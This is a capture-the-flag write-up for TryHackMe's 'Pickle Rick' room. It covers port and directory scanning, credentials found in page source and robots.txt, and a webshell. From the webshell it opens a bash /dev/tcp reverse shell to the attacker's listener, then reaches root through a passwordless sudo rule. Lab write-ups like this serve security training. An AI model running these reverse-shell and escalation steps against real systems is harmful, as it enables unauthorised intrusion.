# [Pickle Rick [easy]](https://tryhackme.com/room/picklerick)

# Recon

```
>>> nmap -sC -sV 10.10.14.40              
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-01 14:15 CET
Nmap scan report for 10.10.14.40
Host is up (0.034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 92:fd:10:c8:93:d1:c6:e8:00:68:08:39:ce:d4:47:20 (RSA)
|   256 97:ca:19:8e:99:72:f7:ac:c5:eb:c0:3b:62:8b:1b:6d (ECDSA)
|_  256 95:47:0f:4d:d8:6a:4d:75:3c:5c:56:7a:2c:0a:85:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds
```

## port 80
![alt text](https://i.imgur.com/QybQPPO.png)

Looking at the source code we can see this comment:
```html
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
So we know that the username is `R1ckRul3s`.

## dir enum

```
>>> gobuster  -u http://10.10.14.40/  -w wordlists/SecLists/Discovery/Web-Content/common.txt -x php,html,html

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.14.40/
[+] Threads      : 10
[+] Wordlist     : wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,html
[+] Timeout      : 10s
=====================================================
2024/02/01 14:21:59 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd.html (Status: 403)
/assets (Status: 301)
/denied.php (Status: 302)
/index.html (Status: 200)
/index.html (Status: 200)
/login.php (Status: 200)
/portal.php (Status: 302)
/robots.txt (Status: 200)
/server-status (Status: 403)
=====================================================
2024/02/01 14:22:59 Finished
=====================================================
```

`login.php` seems interesting let's look at it:

![alt text](https://i.imgur.com/Up3xywf.png)

we know the username but not the password.

After some search I have found something interesting on `http://IP/robots.txt`:

```
Wubbalubbadubdub
```
Trying to use it as a password we can login as R1ckRul3s

![alt text](https://i.imgur.com/skafLpU.png)

Looks like we have a webshell, let's create a [reverseshell](https://hypothetical.me/post/reverse-shell-in-bash/).

On you're machine:
```
nc -lvnp 1235
```
on the web shell:
```
bash -c 'bash -i >& /dev/tcp/yourIP/1235 0>&1'
```

```
nc -lvnp 1235
Listening on 0.0.0.0 1235
Connection received on 10.10.14.40 33080
bash: cannot set terminal process group (1342): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-14-40:/var/www/html$ 
```
Bingo, we are in.

# PrivEsc

Well, their is no privilege escalation because `www-data` don't have any password and is a sudoer so basically with just a `sudo su` we can be root :/

```
www-data@ip-10-10-14-40:/var/www/html$ sudo su
sudo su
id
uid=0(root) gid=0(root) groups=0(root)
```

looking at `/etc/sudoers` we can see this:
```
# User privilege specification
root	ALL=(ALL:ALL) ALL
www-data                ALL=(ALL) NOPASSWD: ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL
```

![alt-text](https://i.imgflip.com/8ec1nx.gif)
